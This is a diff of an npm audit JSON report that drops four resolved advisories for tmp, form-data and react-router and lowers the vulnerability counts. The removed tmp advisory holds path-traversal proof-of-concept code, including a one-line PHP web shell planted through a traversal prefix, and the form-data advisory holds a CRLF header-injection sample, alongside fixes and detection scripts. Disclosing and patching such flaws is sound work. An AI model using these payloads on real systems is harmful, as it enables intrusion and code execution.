@@ -49,36 +49,6 @@
       "action": "update",
       "resolves": [
         {
-          "id": 1120654,
-          "path": "apps__web>cypress>tmp",
-          "dev": false,
-          "optional": false,
-          "bundled": false
-        }
-      ],
-      "module": "tmp",
-      "target": "0.2.7",
-      "depth": 3
-    },
-    {
-      "action": "update",
-      "resolves": [
-        {
-          "id": 1120743,
-          "path": "apps__web>cypress>@cypress/request>form-data",
-          "dev": false,
-          "optional": false,
-          "bundled": false
-        }
-      ],
-      "module": "form-data",
-      "target": "4.0.6",
-      "depth": 4
-    },
-    {
-      "action": "update",
-      "resolves": [
-        {
           "id": 1120793,
           "path": "apps__web>@vitejs/plugin-react>@babel/core",
           "dev": false,
@@ -89,26 +59,6 @@
       "module": "@babel/core",
       "target": "7.29.7",
       "depth": 3
-    },
-    {
-      "action": "review",
-      "module": "react-router",
-      "resolves": [
-        {
-          "id": 1120069,
-          "path": "apps__web>react-router-dom>react-router",
-          "dev": false,
-          "optional": false,
-          "bundled": false
-        },
-        {
-          "id": 1120807,
-          "path": "apps__web>react-router-dom>react-router",
-          "dev": false,
-          "optional": false,
-          "bundled": false
-        }
-      ]
     },
     {
       "action": "review",
@@ -305,84 +255,6 @@
       ],
       "url": "https://github.com/advisories/GHSA-q8mj-m7cp-5q26"
     },
-    "1120069": {
-      "findings": [
-        {
-          "version": "7.14.2",
-          "paths": [
-            "apps__web>react-router-dom>react-router"
-          ]
-        }
-      ],
-      "found_by": null,
-      "deleted": null,
-      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-8x6r-g9mw-2r78\n- https://nvd.nist.gov/vuln/detail/CVE-2026-42342\n- https://github.com/advisories/GHSA-8x6r-g9mw-2r78",
-      "created": "2026-06-03T21:05:17.000Z",
-      "id": 1120069,
-      "npm_advisory_id": null,
-      "overview": "There exists a potential DOS attack vector in React Router Framework Mode applications (as well as Remix v2.10.0 - 2.17.4).  Certain requests can be crafted to consume disproportionate resources on the server, resulting in response time degredation and/or service unavailability for end users.\n\n> [!NOTE]\n> This does not impact your React Router application if you are using [Declarative Mode](https://reactrouter.com/start/modes#declarative) (`<BrowserRouter>`) or [Data Mode](https://reactrouter.com/start/modes#data) (`createBrowserRouter`/`<RouterProvider>`).",
-      "reported_by": null,
-      "title": "React Router vulnerable to DoS via unbounded path expansion in __manifest endpoint",
-      "metadata": null,
-      "cves": [
-        "CVE-2026-42342"
-      ],
-      "access": "public",
-      "severity": "high",
-      "module_name": "react-router",
-      "vulnerable_versions": ">=7.0.0 <7.15.0",
-      "github_advisory_id": "GHSA-8x6r-g9mw-2r78",
-      "recommendation": "Upgrade to version 7.15.0 or later",
-      "patched_versions": ">=7.15.0",
-      "updated": "2026-06-03T21:05:18.000Z",
-      "cvss": {
-        "score": 7.5,
-        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
-      },
-      "cwe": [
-        "CWE-400"
-      ],
-      "url": "https://github.com/advisories/GHSA-8x6r-g9mw-2r78"
-    },
-    "1120654": {
-      "findings": [
-        {
-          "version": "0.2.5",
-          "paths": [
-            "apps__web>cypress>tmp"
-          ]
-        }
-      ],
-      "found_by": null,
-      "deleted": null,
-      "references": "- https://github.com/raszi/node-tmp/security/advisories/GHSA-ph9p-34f9-6g65\n- https://github.com/raszi/node-tmp/commit/efa4a06f24374797ae32ab2b6ae39b7a611ae429\n- https://nvd.nist.gov/vuln/detail/CVE-2026-44705\n- https://github.com/advisories/GHSA-ph9p-34f9-6g65",
-      "created": "2026-05-27T00:34:06.000Z",
-      "id": 1120654,
-      "npm_advisory_id": null,
-      "overview": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `<prefix>-<pid>-<random>-<postfix>`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-<pid>-<random>\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) => {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) => {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) => {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) => {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '<?php system($_GET[\"cmd\"]); ?>');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) => {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) => {\n    if (!err && options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix && options.prefix.includes('..'),\n      options.postfix && options.postfix.includes('..'),  \n      options.dir && path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* && \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
-      "reported_by": null,
-      "title": "tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape",
-      "metadata": null,
-      "cves": [
-        "CVE-2026-44705"
-      ],
-      "access": "public",
-      "severity": "high",
-      "module_name": "tmp",
-      "vulnerable_versions": "<0.2.6",
-      "github_advisory_id": "GHSA-ph9p-34f9-6g65",
-      "recommendation": "Upgrade to version 0.2.6 or later",
-      "patched_versions": ">=0.2.6",
-      "updated": "2026-06-12T19:25:33.000Z",
-      "cvss": {
-        "score": 0,
-        "vectorString": null
-      },
-      "cwe": [
-        "CWE-22"
-      ],
-      "url": "https://github.com/advisories/GHSA-ph9p-34f9-6g65"
-    },
     "1120680": {
       "findings": [
         {
@@ -419,45 +291,6 @@
         "CWE-22"
       ],
       "url": "https://github.com/advisories/GHSA-g7r4-m6w7-qqqr"
-    },
-    "1120743": {
-      "findings": [
-        {
-          "version": "4.0.5",
-          "paths": [
-            "apps__web>cypress>@cypress/request>form-data"
-          ]
-        }
-      ],
-      "found_by": null,
-      "deleted": null,
-      "references": "- https://github.com/form-data/form-data/security/advisories/GHSA-hmw2-7cc7-3qxx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-12143\n- https://github.com/form-data/form-data/commit/64190db548c0179e37206858e39f27cf513e9435\n- https://github.com/form-data/form-data/commit/be3f3cf553978bac15a5182f1f3c3d2d38ccf229\n- https://github.com/form-data/form-data/commit/c7133499c2ee1b80c678e411244f4442bf902045\n- https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#multipart-form-data\n- https://www.npmjs.com/package/form-data\n- https://github.com/advisories/GHSA-hmw2-7cc7-3qxx",
-      "created": "2026-06-15T17:26:26.000Z",
-      "id": 1120743,
-      "npm_advisory_id": null,
-      "overview": "## Summary\n\n`form-data` builds `multipart/form-data` request bodies. Through v4.0.5, the `field` name passed to `FormData#append` and the `filename` option are concatenated directly into the `Content-Disposition` header with no escaping of CR (`\\r`), LF (`\\n`), or `\"`. An application that uses **untrusted input as a field name or filename** therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.\n\nThis is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is **conditional**: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.\n\n## Details\n\nIn `lib/form_data.js`, `_multiPartHeader` builds the part header as:\n\n```javascript\n'Content-Disposition': ['form-data', 'name=\"' + field + '\"'].concat(contentDisposition || [])\n```\n\nand `_getContentDisposition` builds `filename=\"' + filename + '\"'`. Neither escapes control characters, so a `\\r\\n` in `field`/`filename` ends the header line. The same applies to `\"`, which can break out of the quoted parameter.\n\n### Proof of concept\n\n```javascript\nconst FormData = require('form-data');\nconst form = new FormData();\nform.append('email\"\\r\\nX-Injected: true\\r\\nfake=\"', 'user@example.com');\nconsole.log(form.getBuffer().toString());\n```\n\nBefore the fix this emits an injected `X-Injected: true` header line. A field name that also includes `--<boundary>` sequences can introduce additional parts (e.g. an extra `name=\"is_admin\"` field), which a downstream parser accepts as legitimate.\n\n## Impact\n\nFor an application that uses untrusted field names/filenames:\n\n- **Field injection / override (integrity).** Inject or override fields the backend trusts (e.g. `is_admin`, `role`) \u2014 the primary demonstrated impact.\n- **Header injection** into the generated multipart part.\n\nClaims of guaranteed privilege escalation, authentication bypass, high confidentiality impact, and availability impact are application-dependent downstream consequences, not properties of `form-data` itself, and are not demonstrated by the PoC.\n\n### Severity\n\nThe demonstrated, library-attributable impact is integrity (field/header injection); there is no demonstrated confidentiality disclosure or availability impact in `form-data` itself, and exploitation requires the consuming app to feed untrusted data into field names/filenames. A Moderate (\u22485.3, `I:L`) rating is also defensible given that precondition.\n\n## Patch\n\nFixed in **4.0.6**, **3.0.5**, and **2.5.6**. Users on older 0.x/1.x/2.x releases should upgrade to 2.5.6 or later.\n\nThe fix escapes `\\r`, `\\n`, and `\"` as `%0D`, `%0A`, and `%22` in field names and filenames, matching the WHATWG HTML `multipart/form-data` encoding algorithm that browsers implement. This neutralizes the injection while leaving ordinary field names (including `name[0]`, dotted, and unicode names) unchanged.\n\n## Workaround\n\nUntil upgrading, validate or reject field names/filenames that contain control characters before calling `append`:\n\n```javascript\nif (/[\\r\\n]/.test(field)) { throw new Error('invalid field name'); }\n```\n\n## Credit\n\nReported by [yueyueL](https://github.com/yueyueL).",
-      "reported_by": null,
-      "title": "form-data: CRLF injection in form-data via unescaped multipart field names and filenames",
-      "metadata": null,
-      "cves": [
-        "CVE-2026-12143"
-      ],
-      "access": "public",
-      "severity": "high",
-      "module_name": "form-data",
-      "vulnerable_versions": ">=4.0.0 <4.0.6",
-      "github_advisory_id": "GHSA-hmw2-7cc7-3qxx",
-      "recommendation": "Upgrade to version 4.0.6 or later",
-      "patched_versions": ">=4.0.6",
-      "updated": "2026-06-15T17:26:27.000Z",
-      "cvss": {
-        "score": 7.5,
-        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
-      },
-      "cwe": [
-        "CWE-93"
-      ],
-      "url": "https://github.com/advisories/GHSA-hmw2-7cc7-3qxx"
     },
     "1120792": {
       "findings": [
@@ -738,45 +571,6 @@
       ],
       "url": "https://github.com/advisories/GHSA-vxr8-fq34-vvx9"
     },
-    "1120807": {
-      "findings": [
-        {
-          "version": "7.14.2",
-          "paths": [
-            "apps__web>react-router-dom>react-router"
-          ]
-        }
-      ],
-      "found_by": null,
-      "deleted": null,
-      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-84g9-w2xq-vcv6\n- https://github.com/advisories/GHSA-84g9-w2xq-vcv6",
-      "created": "2026-06-15T20:06:15.000Z",
-      "id": 1120807,
-      "npm_advisory_id": null,
-      "overview": "Certain CSRF checks in React Router v7 [Framework Mode]() were insufficient and run on POST requests, but were bypassed on PUT/PATCH/DELETE requests.  This is a low severity vulnerability because modern browser protections (CORS preflight, SameSite cookies) already block the cross-origin attack vectors that this missing CSRF check would otherwise gate.\n\n> [!NOTE]\n> This does not impact your React Router application if you are using [Declarative Mode](https://reactrouter.com/start/modes#framework) (`<BrowserRouter>`) or [Data Mode](https://reactrouter.com/start/modes#data) (`createBrowserRouter`/`<RouterProvider>`).",
-      "reported_by": null,
-      "title": "React Router: Potential CSRF via PUT/PATCH/DELETE document requests",
-      "metadata": null,
-      "cves": [
-        "CVE-2026-53663"
-      ],
-      "access": "public",
-      "severity": "low",
-      "module_name": "react-router",
-      "vulnerable_versions": ">=7.12.0 <7.15.1",
-      "github_advisory_id": "GHSA-84g9-w2xq-vcv6",
-      "recommendation": "Upgrade to version 7.15.1 or later",
-      "patched_versions": ">=7.15.1",
-      "updated": "2026-06-15T20:06:17.000Z",
-      "cvss": {
-        "score": 3.1,
-        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N"
-      },
-      "cwe": [
-        "CWE-352"
-      ],
-      "url": "https://github.com/advisories/GHSA-84g9-w2xq-vcv6"
-    },
     "1120812": {
       "findings": [
         {
@@ -903,14 +697,14 @@
   "metadata": {
     "vulnerabilities": {
       "info": 0,
-      "low": 6,
+      "low": 5,
       "moderate": 11,
-      "high": 3,
+      "high": 0,
       "critical": 0
     },
-    "dependencies": 1567,
+    "dependencies": 1552,
     "devDependencies": 0,
     "optionalDependencies": 0,
-    "totalDependencies": 1567
+    "totalDependencies": 1552
   }
 }
